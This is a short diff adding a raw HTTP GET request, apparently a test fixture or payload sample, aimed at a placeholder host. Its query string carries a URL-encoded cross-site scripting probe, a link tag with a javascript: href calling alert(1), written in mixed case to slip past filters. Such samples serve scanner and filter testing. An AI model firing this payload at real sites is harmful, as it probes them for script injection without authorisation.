@@ -1,0 +1,4 @@
+GET /a?q=<lInK%20rEl%3DStYlEsHeEt%20HrEf%3D"JaVaScRiPt:AlErT(1)"> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
